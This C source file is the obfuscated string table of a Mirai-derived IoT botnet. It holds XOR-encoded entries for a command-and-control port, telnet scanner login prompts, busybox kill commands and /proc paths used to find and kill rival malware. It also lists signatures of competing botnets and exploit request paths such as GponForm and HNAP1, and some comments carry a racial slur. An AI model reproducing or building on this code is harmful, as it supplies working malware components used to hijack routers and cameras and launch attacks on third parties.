#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdedefbaf;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x51\x74", 2); // 1312
    add_entry(TABLE_SCAN_CB_PORT, "\x5B\x1C", 2); // 3912
    add_entry(TABLE_EXEC_SUCCESS, "\x17\x3B\x3A\x3A\x31\x37\x20\x31\x30\x74\x00\x3B\x74\x17\x1A\x17\x54", 17);
    add_entry(TABLE_SCAN_SHELL, "\x27\x3C\x31\x38\x38\x54", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x31\x3A\x35\x36\x38\x31\x54", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x27\x2D\x27\x20\x31\x39\x54", 7);
    add_entry(TABLE_SCAN_SH, "\x27\x3C\x54", 3);
    add_entry(TABLE_SCAN_QUERY, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x07\x1B\x06\x15\x54", 18);
    add_entry(TABLE_SCAN_RESP, "\x07\x1B\x06\x15\x6E\x74\x35\x24\x24\x38\x31\x20\x74\x3A\x3B\x20\x74\x32\x3B\x21\x3A\x30\x54", 23);
    add_entry(TABLE_SCAN_NCORRECT, "\x3A\x37\x3B\x26\x26\x31\x37\x20\x54", 9);
    add_entry(TABLE_SCAN_PS, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x24\x27\x54", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x3F\x3D\x38\x38\x74\x79\x6D\x74\x54", 22);
    add_entry(TABLE_KILLER_PROC, "\x7B\x24\x26\x3B\x37\x7B\x54", 7);
    add_entry(TABLE_KILLER_EXE, "\x7B\x31\x2C\x31\x54", 5);
    add_entry(TABLE_KILLER_FD, "\x7B\x32\x30\x54", 4);
    add_entry(TABLE_KILLER_UPX, "\x77\x72\x7A\x03\x22", 5);
    add_entry(TABLE_KILLER_MAPS, "\x7B\x39\x35\x24\x27\x54", 6);
    add_entry(TABLE_KILLER_TCP, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x20\x37\x24\x54", 14);
	add_entry(TABLE_KILLER_STATUS, "\x7B\x27\x20\x35\x20\x21\x27\x54", 8);
	add_entry(TABLE_KILLER_ANIME, "\x7A\x35\x3A\x3D\x39\x31\x54", 7);
    add_entry(TABLE_MEM_ROUTE, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x26\x3B\x21\x20\x31\x54", 16);
	add_entry(TABLE_MEM_ASSWD, "\x35\x27\x27\x23\x3B\x26\x30\x54", 8);

    add_entry(TABLE_ATK_VSE, "\x00\x07\x3B\x21\x26\x37\x31\x74\x11\x3A\x33\x3D\x3A\x31\x74\x05\x21\x31\x26\x2D\x54", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x7B\x31\x20\x37\x7B\x26\x31\x27\x3B\x38\x22\x7A\x37\x3B\x3A\x32\x54", 17);
    add_entry(TABLE_ATK_NSERV, "\x3A\x35\x39\x31\x27\x31\x26\x22\x31\x26\x74\x54", 12);
    
	add_entry(TABLE_MISC_WATCHDOG, "\x7B\x30\x31\x22\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 14);
	add_entry(TABLE_MISC_WATCHDOG2, "\x7B\x30\x31\x22\x7B\x39\x3D\x27\x37\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 19);
	add_entry(TABLE_SCAN_ASSWORD, "\x24\x36\x36\x32\x2A\x37\x21\x45", 8);
	add_entry(TABLE_SCAN_OGIN, "\x3B\x33\x3D\x3A\x54", 5);
	add_entry(TABLE_SCAN_ENTER, "\x31\x3A\x20\x31\x26\x54", 6);
	add_entry(TABLE_MISC_RAND, "\x65\x33\x36\x35\x60\x37\x30\x3B\x39\x61\x67\x3A\x3C\x24\x65\x66\x31\x3D\x64\x3F\x32\x3E\x54", 23);

    add_entry(TABLE_EXEC_MIRAI, "\x46\x54\x50\x6A\x47\x4E\x52\x47\x50\x22", 10); // dvrHelper
    add_entry(TABLE_EXEC_SORA1, "\x6C\x4B\x65\x65\x47\x70\x14\x1B\x5A\x46\x22", 11); // NiGGeR69xd
    add_entry(TABLE_EXEC_SORA2, "\x13\x11\x11\x15\x71\x4D\x50\x43\x6E\x6D\x63\x66\x67\x70\x22", 15); // 1337SoraLOADER
    add_entry(TABLE_EXEC_SORA3, "\x6C\x4B\x65\x65\x47\x70\x46\x12\x4C\x49\x51\x13\x11\x11\x15\x22", 16); // NiGGeRd0nks1337
    add_entry(TABLE_EXEC_OWARI, "\x7A\x13\x1B\x6B\x10\x11\x1B\x13\x10\x16\x77\x6B\x77\x22", 14); // X19I239124UIU
    add_entry(TABLE_EXEC_OWARI2, "\x6B\x57\x7B\x45\x57\x48\x47\x6B\x53\x4C\x22", 11); // IuYgujeIqn
    add_entry(TABLE_EXEC_JOSHO, "\x13\x16\x64\x43\x22", 5); // 14Fa
    add_entry(TABLE_EXEC_APOLLO, "\x41\x41\x63\x66\x22", 5); // ccAD
    add_entry(TABLE_EXEC_ROUTE, "\x0D\x52\x50\x4D\x41\x0D\x4C\x47\x56\x0D\x50\x4D\x57\x56\x47\x22", 16); // /proc/net/route
    add_entry(TABLE_EXEC_CPUINFO, "\x0D\x52\x50\x4D\x41\x0D\x41\x52\x57\x4B\x4C\x44\x4D\x22", 14); // /proc/cpuinfo
    add_entry(TABLE_EXEC_BOGO, "\x60\x6D\x65\x6D\x6F\x6B\x72\x71\x22", 9); // BOGOMIPS
    add_entry(TABLE_EXEC_RC, "\x0D\x47\x56\x41\x0D\x50\x41\x0C\x46\x0D\x50\x41\x0C\x4E\x4D\x41\x43\x4E\x22", 19); // /etc/rc.d/rc.local
    add_entry(TABLE_EXEC_MASUTA1, "\x45\x13\x43\x40\x41\x16\x46\x4F\x4D\x11\x17\x4A\x4C\x52\x10\x4E\x4B\x47\x12\x49\x48\x44\x22", 23); // g1abc4dmo35hnp2lie0kjf
    add_entry(TABLE_EXEC_MIRAI1, "\x0D\x46\x47\x54\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 14); // /dev/watchdog
    add_entry(TABLE_EXEC_MIRAI2, "\x0D\x46\x47\x54\x0D\x4F\x4B\x51\x41\x0D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 19); // /dev/misc/watchdog
    add_entry(TABLE_EXEC_VAMP1, "\x0D\x46\x47\x54\x0D\x64\x76\x75\x66\x76\x13\x12\x13\x7D\x55\x43\x56\x41\x4A\x46\x4D\x45\x22", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_EXEC_VAMP3, "\x0D\x46\x47\x54\x0D\x4C\x47\x56\x51\x4E\x4B\x4C\x49\x0D\x22", 15); // /dev/netslink/
    add_entry(TABLE_EXEC_IRC1, "\x72\x70\x6B\x74\x6F\x71\x65\x22", 8); // PRIVMSG
    add_entry(TABLE_EXEC_QBOT1, "\x65\x67\x76\x6E\x6D\x61\x63\x6E\x6B\x72\x22", 11); // GETLOCALIP
    add_entry(TABLE_EXEC_QBOT2, "\x69\x6B\x6E\x6E\x63\x76\x76\x69\x22", 9); // KILLATTK
    add_entry(TABLE_EXEC_IRC2, "\x67\x43\x56\x51\x1A\x22", 6); // Eats8
    add_entry(TABLE_EXEC_MIRAI3, "\x54\x79\x12\x54\x22", 5); // v[0v
    add_entry(TABLE_EXEC_OMNI, "\x1B\x11\x6D\x44\x48\x6A\x78\x10\x58\x22", 10); // 93OfjHZ2z
    add_entry(TABLE_EXEC_LOL, "\x65\x4A\x4D\x51\x56\x75\x57\x58\x6A\x47\x50\x47\x14\x14\x14\x22", 15); // GhostWuzHere666
    add_entry(TABLE_EXEC_SHINTO3, "\x75\x51\x65\x63\x16\x62\x64\x14\x64\x22", 10); // WsGA4@F6F
    add_entry(TABLE_EXEC_SHINTO5, "\x63\x61\x66\x60\x22", 5); // ACDB
    add_entry(TABLE_EXEC_JOSHO5, "\x63\x40\x63\x46\x22", 5); // AbAd
    add_entry(TABLE_EXEC_JOSHO4, "\x4B\x43\x65\x54\x22", 5); // iaGv
    
    // "POST /wanipcn.xml"
    add_entry(TABLE_KILLER_REP1, "\x72\x6D\x71\x76\x02\x0D\x55\x43\x4C\x4B\x52\x41\x4C\x0C\x5A\x4F\x4E\x22", 18);
    // "POST /picdesc.xml"
    add_entry(TABLE_KILLER_REP2, "\x72\x6D\x71\x76\x02\x0D\x52\x4B\x41\x46\x47\x51\x41\x0C\x5A\x4F\x4E\x22", 18);
    // "POST /ctrlt/"
    add_entry(TABLE_KILLER_REP3, "\x72\x6D\x71\x76\x02\x0D\x41\x56\x50\x4E\x56\x0D\x22", 13);
    // "POST /HNAP1/"
    add_entry(TABLE_KILLER_REP4, "\x72\x6D\x71\x76\x02\x0D\x6A\x6C\x63\x72\x13\x0D\x22", 13);
    // "GET /login.cgi"
    add_entry(TABLE_KILLER_REP5, "\x65\x67\x76\x02\x0D\x4E\x4D\x45\x4B\x4C\x0C\x41\x45\x4B\x22", 15);
    // "POST /tmUnblock.cgi"
    add_entry(TABLE_KILLER_REP6, "\x72\x6D\x71\x76\x02\x0D\x56\x4F\x77\x4C\x40\x4E\x4D\x41\x49\x0C\x41\x45\x4B\x22", 20);
    // "POST /cgi-bin/"
    add_entry(TABLE_KILLER_REP7, "\x72\x6D\x71\x76\x02\x0D\x41\x45\x4B\x0F\x40\x4B\x4C\x0D\x22", 15);
    // "POST /GponForm/"
    add_entry(TABLE_KILLER_REP8, "\x72\x6D\x71\x76\x02\x0D\x65\x52\x4D\x4C\x64\x4D\x50\x4F\x0D\x22", 16);
    // "GET /index.php"
    add_entry(TABLE_KILLER_REP9, "\x65\x67\x76\x02\x0D\x4B\x4C\x46\x47\x5A\x0C\x52\x4A\x52\x22", 15);
    // "GET /shell"
    add_entry(TABLE_KILLER_REP10, "\x65\x67\x76\x02\x0D\x51\x4A\x47\x4E\x4E\x22", 11);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
